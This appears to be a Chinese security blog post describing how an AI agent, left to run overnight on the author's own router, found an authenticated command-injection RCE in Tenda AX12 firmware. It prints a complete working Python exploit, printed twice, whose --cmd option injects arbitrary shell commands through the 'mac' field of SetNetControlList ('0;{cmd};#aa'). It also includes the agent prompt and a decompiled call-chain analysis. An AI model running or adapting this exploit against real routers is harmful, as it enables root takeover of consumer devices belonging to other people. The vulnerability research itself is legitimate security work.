#  睡了个觉+花费2 元，AI挖出我的第一个 IOT RCE 漏洞  
 星悦安全   2026-05-11 08:16  
  
> 断更好久了，今天突然复活一下，粉丝投稿了一个关于AI安全的小案例，感觉还挺有意思...  
  
# 睡了个觉➕花费2 元，AI挖出我的第一个 IOT RCE 漏洞  
## 起因  
  
最近心血来潮，突然想接触一些关于IOT相关的内容，但是由于之前基本没有怎么接触过，基础有限，最近又刷到各种AI agent，AI CTF相关的内容，于是就想试试能不能让我一个没怎么接触过IOT，使用AI去挖掘到我的第一个IOT相关的漏洞  
## 环境准备  
### 1. AI中转  
### 2.目标准备  
> 我找了一台家里闲置的路由器  
  
  
![00cc1c66661e83e837e19e1753dc3086](https://mmbiz.qpic.cn/mmbiz_jpg/1qHRguR9NhR0MtlO0QgOJuhrdSHFnI8lGLDmjSiczyW9ibiakmXfMxxQREofUianQkibibANYOJtqkWK58SS0Sc5aLtmjGvXo9IvY9ZLJWTrjc1Vs/640?wx_fmt=jpeg&from=appmsg "")  
## 漏洞复现  
### 1. Prompt提示词  
  
用 $ctf-sandbox 这个 skill 来完成接下来的 CTF-IOT 挑战。已知http://192.168.111.1/是路由器管理员地址，唯一知道的信息是管理员密码为 88888888，这个路由器为本地测试环境，可以做任何测试。 你需要自己获取到该设备的固件版本（已知型号是 tenda-AX12），并去网上找到相关版本固件，下载到本地并解压。对解压后的文件系统进行审计，所需二进制文件分析，必须使用 IDA 打开并通过 IDA-MCP 进行审计，找到 RCE 漏洞，并在当前本地路由器测试环境验证。所有的分析必须经过实际ida 的代码审计，不允许随意猜测或从网上寻找相关漏洞资料。 验证方式为执行sleep x，根据响应延迟判断漏洞是否存在，如果遇见高置信漏洞，但 sleep 无法测试的话，可以采用执行wget 或者 curl 的方式，请求本机的一个端口，本机检测是否有请求过来。最终给我一个 exp.py 和 wp.md帮我完成这个 CTF 挑战。  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1qHRguR9NhQ7wZVmCaUFKiax1CEmn7oXGHQOB79ATuJbsZsu6yibQhPUQZeO8NPTDnASD586rmGrpTQcsFuu49T1Zziaiawia9IggAYZJD7Q7ftU/640?wx_fmt=jpeg&from=appmsg "")  
  
因为我先看看如果没有人工进行干预，他到底能做到什么样，所以喂给他这个提示词后，我就去洗漱睡觉了  
### 2. 结果  
  
第二天睡醒， AI 已经给我整理好了一份 exp.py以及一份详细的 wp.md 文档。里面记录了 AI 研究的所有过程，同时 exp.py 运行后直接获取了路由器的 root shell，虽然耗时还是比较久，但是我根本没有去管他，他能自主做到这种地步我已经很满意了，有一种马上要被ai取代的感觉了...  
  
![feb996d9b9f2c157ff34bc044fae61b1](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhRGeWhf277TtylJlQgO7aSvfEibrW8KywR6ZuffA6PBLuia9TG2jMoU0Vicd4tLyAGibCB5QUUTkpl1icyOCBNh5Jlmugrw4sHGpnvE/640?wx_fmt=png&from=appmsg "")  
### 3. 花费  
> 任务是从晚上十点多用 GPT-5.4 模型开始跑的，截止凌晨 1:23 跑完的。每个小时的花费分别为  0.23 0.6 1.01 0.27。总计 2.11元，相当于两元买了一个RCE..  
  
  
![23d688fdf67a5e250dd213b1105b1abf](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhS1WibO0dsZEPlEdZ3Pr03HUd5c7FJTM5PySb1qEOcweCgs6ktcvd9n7M8iaskzuxuiaWV7cZB5yFmugpPSLULwLhU5ja6OddpmAI/640?wx_fmt=png&from=appmsg "")  
## EXP  
```
#!/usr/bin/env python3import argparseimport base64import hashlibimport jsonimport timefrom urllib.parse import urljoinimport requestsfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadIV = b"EU5H62G9ICGRNI43"class AX12Client:    def __init__(self, base_url, password, timeout=10):        self.base_url = base_url.rstrip("/") + "/"        self.password = password        self.timeout = timeout        self.session = requests.Session()        self.sign = None    def url(self, path):        return urljoin(self.base_url, path.lstrip("/"))    def login(self):        digest = hashlib.md5(self.password.encode()).hexdigest()        r = self.session.post(            self.url("/login/Auth"),            data={"username": "admin", "password": digest},            allow_redirects=False,            timeout=self.timeout,        )        if r.status_code not in (200, 302):            raise RuntimeError(f"login failed: HTTP {r.status_code}")        r = self.session.get(self.url("/goform/stokCfg"), timeout=self.timeout)        r.raise_for_status()        data = r.json()["stokCfg"]        self.sign = data["sign"].encode()        return data    def encrypt(self, body):        if self.sign is None:            raise RuntimeError("not logged in")        cipher = AES.new(self.sign, AES.MODE_CBC, IV)        return base64.b64encode(cipher.encrypt(pad(body.encode(), AES.block_size))).decode()    def decrypt_response(self, text):        try:            obj = json.loads(text)        except json.JSONDecodeError:            return text        if "data" not in obj:            return text        cipher = AES.new(self.sign, AES.MODE_CBC, IV)        return unpad(cipher.decrypt(base64.b64decode(obj["data"])), AES.block_size).decode()    def get_form(self, path):        r = self.session.get(self.url(path), timeout=self.timeout)        r.raise_for_status()        return self.decrypt_response(r.text)    def post_form(self, path, body, timeout=None):        timeout = self.timeout if timeout is None else timeout        encrypted = self.encrypt(body)        start = time.monotonic()        r = self.session.post(self.url(path), data=encrypted, timeout=timeout)        elapsed = time.monotonic() - start        r.raise_for_status()        return elapsed, self.decrypt_response(r.text)def detect_version(client):    data = json.loads(client.get_form("/goform/GetSystemStatus"))    return data.get("adv_firm_ver"), data.get("adv_hard_ver")def build_netcontrol_body(cmd=None, dev_name="dev", limit_up=128, limit_down=128):    mac = "00:11:22:33:44:55"    if cmd:        mac = f"0;{cmd};#aa"    return f"list={dev_name}\r{mac}\r{int(limit_up)}\r{int(limit_down)}"def post_netcontrol(client, body, timeout=20):    start = time.monotonic()    try:        elapsed, resp = client.post_form("/goform/SetNetControlList", body, timeout=timeout)        print(f"[*] SetNetControlList response: {elapsed:.2f}s {resp}")        return elapsed, resp, False    except requests.exceptions.ReadTimeout:        elapsed = time.monotonic() - start        print(f"[!] SetNetControlList timed out after {elapsed:.2f}s; command may still have executed")        return elapsed, None, Truedef exploit_sleep(client, seconds):    body = build_netcontrol_body(cmd=f"sleep {int(seconds)}")    elapsed, _, _ = post_netcontrol(client, body, timeout=max(15, seconds + 10))    if elapsed >= max(1, seconds - 0.75):        print(f"[+] RCE verified by delay: expected ~{seconds}s, observed {elapsed:.2f}s")        return True    print(f"[-] no convincing delay: expected ~{seconds}s, observed {elapsed:.2f}s")    return Falsedef exploit_cmd(client, cmd, timeout=20):    body = build_netcontrol_body(cmd=cmd)    elapsed, resp, timed_out = post_netcontrol(client, body, timeout=timeout)    if timed_out:        print("[+] payload sent; HTTP timed out, please verify by side effect")    else:        print(f"[+] payload sent in {elapsed:.2f}s, response: {resp}")def main():    parser = argparse.ArgumentParser(description="Tenda AX12 authenticated RCE verifier for SetNetControlList command injection")    parser.add_argument("-u", "--url", default="http://192.168.111.1/", help="router base URL")    parser.add_argument("-p", "--password", default="88888888", help="admin password")    parser.add_argument("--sleep", type=int, default=5, help="sleep seconds for timing verification")    parser.add_argument("--cmd", help="run an arbitrary shell command through SetNetControlList")    parser.add_argument("--timeout", type=int, default=20, help="HTTP timeout for the exploit request")    args = parser.parse_args()    client = AX12Client(args.url, args.password)    stok = client.login()    print(f"[*] logged in, stok={stok.get('stok')} sign={stok.get('sign')}")    version, hardware = detect_version(client)    print(f"[*] device firmware={version} hardware={hardware}")    if args.cmd:        exploit_cmd(client, args.cmd, timeout=args.timeout)    else:        ok = exploit_sleep(client, args.sleep)        raise SystemExit(0 if ok else 1)if __name__ == "__main__":    main()
#!/usr/bin/env python3import argparseimport base64import hashlibimport jsonimport timefrom urllib.parse import urljoinimport requestsfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadIV = b"EU5H62G9ICGRNI43"class AX12Client:    def __init__(self, base_url, password, timeout=10):        self.base_url = base_url.rstrip("/") + "/"        self.password = password        self.timeout = timeout        self.session = requests.Session()        self.sign = None    def url(self, path):        return urljoin(self.base_url, path.lstrip("/"))    def login(self):        digest = hashlib.md5(self.password.encode()).hexdigest()        r = self.session.post(            self.url("/login/Auth"),            data={"username": "admin", "password": digest},            allow_redirects=False,            timeout=self.timeout,        )        if r.status_code not in (200, 302):            raise RuntimeError(f"login failed: HTTP {r.status_code}")        r = self.session.get(self.url("/goform/stokCfg"), timeout=self.timeout)        r.raise_for_status()        data = r.json()["stokCfg"]        self.sign = data["sign"].encode()        return data    def encrypt(self, body):        if self.sign is None:            raise RuntimeError("not logged in")        cipher = AES.new(self.sign, AES.MODE_CBC, IV)        return base64.b64encode(cipher.encrypt(pad(body.encode(), AES.block_size))).decode()    def decrypt_response(self, text):        try:            obj = json.loads(text)        except json.JSONDecodeError:            return text        if "data" not in obj:            return text        cipher = AES.new(self.sign, AES.MODE_CBC, IV)        return unpad(cipher.decrypt(base64.b64decode(obj["data"])), AES.block_size).decode()    def get_form(self, path):        r = self.session.get(self.url(path), timeout=self.timeout)        r.raise_for_status()        return self.decrypt_response(r.text)    def post_form(self, path, body, timeout=None):        timeout = self.timeout if timeout is None else timeout        encrypted = self.encrypt(body)        start = time.monotonic()        r = self.session.post(self.url(path), data=encrypted, timeout=timeout)        elapsed = time.monotonic() - start        r.raise_for_status()        return elapsed, self.decrypt_response(r.text)def detect_version(client):    data = json.loads(client.get_form("/goform/GetSystemStatus"))    return data.get("adv_firm_ver"), data.get("adv_hard_ver")def build_netcontrol_body(cmd=None, dev_name="dev", limit_up=128, limit_down=128):    mac = "00:11:22:33:44:55"    if cmd:        mac = f"0;{cmd};#aa"    return f"list={dev_name}\r{mac}\r{int(limit_up)}\r{int(limit_down)}"def post_netcontrol(client, body, timeout=20):    start = time.monotonic()    try:        elapsed, resp = client.post_form("/goform/SetNetControlList", body, timeout=timeout)        print(f"[*] SetNetControlList response: {elapsed:.2f}s {resp}")        return elapsed, resp, False    except requests.exceptions.ReadTimeout:        elapsed = time.monotonic() - start        print(f"[!] SetNetControlList timed out after {elapsed:.2f}s; command may still have executed")        return elapsed, None, Truedef exploit_sleep(client, seconds):    body = build_netcontrol_body(cmd=f"sleep {int(seconds)}")    elapsed, _, _ = post_netcontrol(client, body, timeout=max(15, seconds + 10))    if elapsed >= max(1, seconds - 0.75):        print(f"[+] RCE verified by delay: expected ~{seconds}s, observed {elapsed:.2f}s")        return True    print(f"[-] no convincing delay: expected ~{seconds}s, observed {elapsed:.2f}s")    return Falsedef exploit_cmd(client, cmd, timeout=20):    body = build_netcontrol_body(cmd=cmd)    elapsed, resp, timed_out = post_netcontrol(client, body, timeout=timeout)    if timed_out:        print("[+] payload sent; HTTP timed out, please verify by side effect")    else:        print(f"[+] payload sent in {elapsed:.2f}s, response: {resp}")def main():    parser = argparse.ArgumentParser(description="Tenda AX12 authenticated RCE verifier for SetNetControlList command injection")    parser.add_argument("-u", "--url", default="http://192.168.111.1/", help="router base URL")    parser.add_argument("-p", "--password", default="88888888", help="admin password")    parser.add_argument("--sleep", type=int, default=5, help="sleep seconds for timing verification")    parser.add_argument("--cmd", help="run an arbitrary shell command through SetNetControlList")    parser.add_argument("--timeout", type=int, default=20, help="HTTP timeout for the exploit request")    args = parser.parse_args()    client = AX12Client(args.url, args.password)    stok = client.login()    print(f"[*] logged in, stok={stok.get('stok')} sign={stok.get('sign')}")    version, hardware = detect_version(client)    print(f"[*] device firmware={version} hardware={hardware}")    if args.cmd:        exploit_cmd(client, args.cmd, timeout=args.timeout)    else:        ok = exploit_sleep(client, args.sleep)        raise SystemExit(0 if ok else 1)if __name__ == "__main__":    main()
```  
  
![92f10e77-f409-4759-8893-8333aec62d9b](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhTNbkicX5ibFVVfT7TtbJZOWO4KThnvRYLcxZWRwZBxqTHNf8ibybzzaamXzRpCN0OPsNla96ZQwicNIibylcDBrOXVWnr532S2qOhQ/640?wx_fmt=png&from=appmsg "")  
## 分析报告  
> 后面根据AI生成的报告，我也去进行了相关的跟踪和研究，这里列一下 AI 分析的关键调用链，这个漏洞的调用链其实还是稍微长一些的，并且需要跨进程分析。  
  
  
首先在 httpd  
 中定位接口注册点，在 httpd::sub_41DE60  
 中注册了 sub_40A144("SetNetControlList", sub_43FDCC);  
。  
  
![SetNetControlList 路由注册](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhQUibhYMkx3lOOs1jvJsOtc5UKelWTxHd0LU9j6aJgFzchxnmiamLJKSMpxbXUSpnicvc3ty5BF5ZpXhVlbs7HbOgPIrCfZ8hhzDM/640?wx_fmt=png&from=appmsg "")  
  
继续跟进 sub_43FDCC  
。从伪代码可以直接看到，接口从请求中直接读取参数 list  
；真实危险路径不是同步执行，而是 fork()  
 之后由子进程调用 set_tc_rule()  
。也就是说，这个洞的后半段天然是异步的，所以不能只靠 HTTP 响应时间判断漏洞是否存在。  
  
![sub_43FDCC 入口处理逻辑](https://mmbiz.qpic.cn/sz_mmbiz_png/1qHRguR9NhS8WpOiciaiawSsm5ZS6mZEvgvC7COJZKkmfBgomxG95iaSNbuJ0grMFr826lA2mMUugw5z6YNibXbKANc4KROicwYaccGFgx6ozwUbY/640?wx_fmt=png&from=appmsg "")  
  
接下来跟进 sub_43FBBC  
，确认 list  
 的真实格式。图中红框对应的核心逻辑是：sscanf(v14, "%[^\r]\r%[^\r]\r%[^\r]\r%s", v15, v13, v12, v11);  
 这意味着 list  
 的一条记录会被按以下顺序解析：dev_name \r mac \r limit_up \r limit_down  
。也就是：设备名 dev_name  
、MAC 字段 mac  
、上行速率 limit_up  
、下行速率 limit_down  
。  
  
![sub_43FBBC 的字段解析逻辑](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhQBCHfiarRGjeptlDQfBQnOticfpJsZV9OCncbYt2y7rAC3JC3Dib8mibDMReaEyibX2mXj6Tsn40wgmpp9MzVfibicVO4bh6s5ywPiarY/640?wx_fmt=png&from=appmsg "")  
  
继续看 sub_43F8DC  
，a2  
 就是上一层解析出来的 mac,它会被直接写入 qos.@device_rule[%d].mac  
,写完后立刻 CfgCommit("qos")  
。这说明攻击者输入不是临时内存变量，而是被持久化进了设备配置。这一层的数据流已经很明确：  
```
HTTP list -> parsed mac -> qos.@device_rule[*].mac
HTTP list -> parsed mac -> qos.@device_rule[*].mac
```  
  
![sub_43F8DC 将 mac 写入 qos 配置](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhR1uT4e4uibw4p2shfAMQbqpLEyHuQ0Zt5ib0nZwQhBzibUOqDTUFkwEXkKgaQotkXiaEPDGTXYE2oUfP2EzjGq50ictWH3AoYQXIic4/640?wx_fmt=png&from=appmsg "")  
  
接下来进入 libtd_server.so  
，跟踪 set_tc_rule()  
。可以看到：  
```
qos_rule_config = get_qos_rule_config((int)v13);
qos_rule_config = get_qos_rule_config((int)v13);
```  
  
这一步说明前面落地到 UCI 的 qos  
 配置，后面会被 set_tc_rule()  
 从配置文件重新读回内存。也就是说，攻击者对 qos.@device_rule[*].mac  
 的污染，不会停留在配置层，而会继续向命令执行层流动。  
  
![set_tc_rule 调用 get_qos_rule_config](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhSnmK8PicdkLFialgyiabGpviaF499UBj8IjVMngeMtlIZkpzvzMSB0E6pyVJWGayrJ1ian9BHvibibqAu09OEkf0iaoThBqCUMiaxnfnWU/640?wx_fmt=png&from=appmsg "")  
  
下图能推导出三件事：  
1. get_qos_rule_config() 把每条 device_rule 读入缓冲区 v13  
  
1. 每条记录步长固定是 48 字节  
  
1. add_tc_traffic_control() 收到的第二个参数 a2 就是当前记录起始地址  
  
![get_qos_rule_config 从 qos 中读取 device_rule](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhR4IFPztfTDic1HXR4ic1qj95VwU8cFsTdiccdGILspR0IzwibyicNM5pIgMIKgvyxkKDvJP0vtegcI5HdCAqj8sGCy1ppZ0mnp94k8/640?wx_fmt=png&from=appmsg "")  
  
继续跟进 add_tc_traffic_control()  
 本身，结合上一层调用已经可以确认：  
- a2 = mac  
  
- a3 = limit_up  
  
- a4 = limit_down  
  
这一步把“可控字段”和“危险函数参数”正式对上了。  
  
![add_tc_traffic_control 的参数签名](https://mmbiz.qpic.cn/sz_mmbiz_png/1qHRguR9NhSRCkagFC9bSoQaibQicCvx4B3OjtLoKvlMoKSKcHibCJLCiaN7EmLLF5dm5W5YE8icbHYFkTYoZCoQeiavn2ELkhICZLQewWuoO11yE/640?wx_fmt=png&from=appmsg "")  
  
最关键的证据在下面这张图。这是最终的决定性证据：  
- a2 被直接以 %s 形式拼进 shell 命令  
  
- 这里没有任何 shell escaping  
  
- 也没有对 mac 做格式校验  
  
- 最后经 doSystemCmd() 直接执行  
  
也就是说，只要 a2  
 中出现 ;  
、#  
 这类 shell 元字符，就能打断原有命令并执行攻击者自己的命令。  
  
至此，漏洞链闭环。  
  
![add_tc_traffic_control 直接拼接 iptables 并执行](https://mmbiz.qpic.cn/mmbiz_png/1qHRguR9NhR06C8J3ibbORqq3XBlbibibfsDicV7n0dA4CQliadOCKpjO5sFvju90r9iaaibUcd9zqbZPkELOXnWXbHUsTUkq4gfGpCJRPYSRQrnrk/640?wx_fmt=png&from=appmsg "")  
## 结语  
> 大家如果感兴趣可以去多尝试一下，现在的大模型能力我觉得已经能支撑很大一部分的工作，不必因为ai而焦虑，拥抱安全，拥抱ai，如果大家对AI挖洞有兴趣的话，后面还可以继续更新相关系列的文章，如果大家有好的AI安全的思路和想法，欢迎大家交流！！  
  
  
